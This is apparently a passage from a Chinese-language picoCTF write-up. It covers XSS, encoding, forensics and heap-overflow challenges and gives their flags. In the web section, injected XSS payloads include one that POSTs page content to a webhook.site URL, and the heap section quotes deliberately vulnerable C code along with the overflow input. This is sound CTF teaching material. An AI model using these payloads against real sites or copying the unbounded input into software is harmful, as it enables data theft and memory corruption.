const js = await readFile('static/index.js', 'utf-8');
const flag = await readFile('flag.txt', 'utf-8');

let visiting = false;

...處理瀏覽器訪問...
```
```
http://rhea.picoctf.net:52830/remoteCraft?recipe={"recipe":[["Fire","Water"]]}

>> invalid recipe!
```

```
偽造recipe 讓他丟出/flag.txt
http://rhea.picoctf.net:52830/remoteCraft?recipe={"recipe":[["Fire","Water"]],"xss":"fetch('/flag.txt').then(response => response.text()).then(data => alert(data));"}

/remoteCraft?recipe={"recipe":[["Fire","Water"]],"xss":"alert(fetch('/flag.txt'))"}

/remoteCraft?recipe={"recipe":[["Fire","Water"]],"xss":["alert(fetch('http://127.0.0.1:8080/flag.txt').then(response => response.text()).then(data => alert(data)));"]}

/remoteCraft?recipe={"recipe":[["Fire","Water"]],"xss":"fetch('https://webhook.site/89a33e4d-1e15-48e6-bdb8-0df74726398b', { method: 'POST', body: JSON.stringify({ flag: document.querySelector('body').innerText }) })"}

/remoteCraft?recipe={"recipe":[["Fire","Water"]],"xss":"encodeURIComponent("fetch('/flag.txt').then(response => response.text()).then(data => alert(data));")"}



```



# Cryptography (5)
![image](https://hackmd.io/_uploads/HkD5vsCTp.png)

## interencdec
![image](https://hackmd.io/_uploads/ryB2PoA6p.png)

### interencdec Solution
enc_flag
![image](https://hackmd.io/_uploads/Byamdj0TT.png)
> YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6YzRNalV3YUcxcWZRPT0nCg==

"==" 疑似Base64
● Base64 decode
![image](https://hackmd.io/_uploads/ByVOuoCaa.png)
> b'd3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzc4MjUwaG1qfQ=='

● Base64 double decode
![image](https://hackmd.io/_uploads/SyeFTiRpp.png)
> wpjvJAM{jhlzhy_k3jy9wa3k_78250hmj}

● Caesar Decoder
https://www.dcode.fr/caesar-cipher
![image](https://hackmd.io/_uploads/rkXnl2RaT.png)
### GET FLAG
**FLAG:picoCTF{caesar_d3cr9pt3d_78250afc}**



# Forensics (8)
## Scan Surprise
![image](https://hackmd.io/_uploads/H1m9bnATa.png)

### Scan Surprise Solution
flag.png
![image](https://hackmd.io/_uploads/H1_xG2A6T.png)
> https://www.google.com/search?q=picoCTF%7Bp33k_%40_b00_b5ce2572%7D&ie=UTF-8&oe=UTF-8&hl=en-us&client=safari

### GET FLAG
**FLAG:picoCTF{p33k_@_b00_b5ce2572}**

## Verify
![image](https://hackmd.io/_uploads/BJf93xJC6.png)
```command
ssh -p 57179 ctf-player@rhea.picoctf.net
```

### Verify Solution

## CanYouSee
![image](https://hackmd.io/_uploads/B1vFaeJRp.png)
ukn_reality.jpg
![image](https://hackmd.io/_uploads/rkVM0x1AT.png)

## Secret of the Polyglot
![image](https://hackmd.io/_uploads/BJABqGJR6.png)

flag2of2-final.pdf
![image](https://hackmd.io/_uploads/rJ8EszyRa.png)

### Secret of the Polyglot Solution
```command
cp flag2of2-final.pdf flag2of2-final.png
```
![image](https://hackmd.io/_uploads/rkbLoMkR6.png)

#### OPEN PNG file
![image](https://hackmd.io/_uploads/HJwOiGk06.png)

### GET FLAG
**FLAG:picoCTF{f1u3n7_1n_pn9_&_pdf_249d05c0}**

## Mob psycho
![image](https://hackmd.io/_uploads/HJ912G106.png)

mobpsycho.apk
![image](https://hackmd.io/_uploads/S14A2zyA6.png)

### Mob psycho Solution
```command
unzip mobpsycho.apk
```
![image](https://hackmd.io/_uploads/Hk186MJ06.png)
#### find flag file 
![image](https://hackmd.io/_uploads/HJa_7_1Aa.png)
> 7069636f4354467b6178386d433052553676655f4e5838356c346178386d436c5f38356462643231357d

#### HEX convert to ASCII
![image](https://hackmd.io/_uploads/ryf1rd1CT.png)

### GET FLAG
**FLAG:picoCTF{ax8mC0RU6ve_NX85l4ax8mCl_85dbd215}**


# Binary Exploitation (10)

## format string 0
![image](https://hackmd.io/_uploads/HkguEQyRp.png)
```command
nc mimas.picoctf.net 62743
```
![image](https://hackmd.io/_uploads/ByzTEX1Ra.png)

### format string 0 Solution
![image](https://hackmd.io/_uploads/HknREmy0a.png)

### GET FLAG
**FLAG:picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}**

## heap 0

![image](https://hackmd.io/_uploads/r13gtsJCT.png)
```command
nc tethys.picoctf.net 54484
```
![image](https://hackmd.io/_uploads/BJTVKj1Cp.png)
### heap 0 Solution
chall.c
```c=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap0!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	int rval = scanf("%d", &choice);
	if (rval == EOF){
	    exit(0);
	}
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
	    exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}

```
> 要取得 flag，你需要利用程式中的漏洞來修改 `safe_var` 的值，使其不等於 "bico"，這樣當程式檢查 `safe_var` 的值時就會打印出 flag。
在這個程式中，使用選項 2 (`Write to buffer`) 可以讓你寫入資料到 `input_data` 中，但是沒有對輸入的長度進行檢查。這就意味著你可以寫入比 `input_data` 分配的空間更多的資料，導致堆溢出。你可以利用這個漏洞寫入足夠長的資料到 `input_data`，以修改 `safe_var` 的值。
以下是一種可能的方法：
1. 選擇選項 2 (`Write to buffer`)，並輸入足夠長的資料，以使堆溢出發生。
2. 利用堆溢出，修改 `safe_var` 的值為不等於 "bico" 的值。你可以在 `input_data` 中寫入一個超過 `safe_var` 大小的值，這樣就可以改變 `safe_var` 的值。
3. 選擇選項 4 (`Print Flag`)，此時程式會檢查 `safe_var` 的值，如果已經成功修改了 `safe_var`，就會打印出 flag。

```command
Enter your choice: 2
Data for buffer: 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
```

![image](https://hackmd.io/_uploads/SJ-aKo1Ap.png)

```command
Enter your choice: 4
```
![image](https://hackmd.io/_uploads/BkqCKiy06.png)

### GET FLAG
**FLAG:picoCTF{my_first_heap_overflow_1ad0e1a6}**
